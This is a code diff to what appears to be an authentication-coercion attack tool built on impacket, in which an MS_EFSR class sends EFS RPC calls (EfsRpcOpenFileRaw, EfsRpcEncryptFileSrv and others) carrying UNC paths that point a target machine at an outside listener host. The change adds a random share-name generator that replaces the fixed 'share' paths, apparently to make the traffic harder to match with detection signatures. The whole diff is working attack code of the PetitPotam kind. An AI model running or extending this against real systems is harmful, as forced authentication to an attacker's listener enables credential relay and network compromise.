@@ -7,10 +7,19 @@
 
 import sys
 import time
+import random
 from .RPCProtocol import RPCProtocol, DCERPCSessionError
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+
+def gen_random_name(length=8):
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    name = ""
+    for k in range(length):
+        name += random.choice(alphabet)
+    return name
 
 
 class EfsRpcEncryptFileSrv(NDRCALL):
@@ -102,7 +111,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcOpenFileRaw()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['Flags'] = 0
                     if self.debug:
                         request.dump()
@@ -135,7 +144,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcEncryptFileSrv()
-                    request['FileName'] = '\\\\%s\\share\\settings.ini\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -168,7 +177,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcDecryptFileSrv()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['long'] = 0
                     if self.debug:
                         request.dump()
@@ -201,7 +210,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcQueryUsersOnFile()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -234,7 +243,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcQueryRecoveryAgents()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
                         request.dump()
                     resp = self.dce.request(request)
@@ -266,7 +275,7 @@ class MS_EFSR(RPCProtocol):
                 sys.stdout.flush()
                 try:
                     request = EfsRpcFileKeyInfo()
-                    request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
+                    request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['InfoClass'] = 0
                     if self.debug:
                         request.dump()
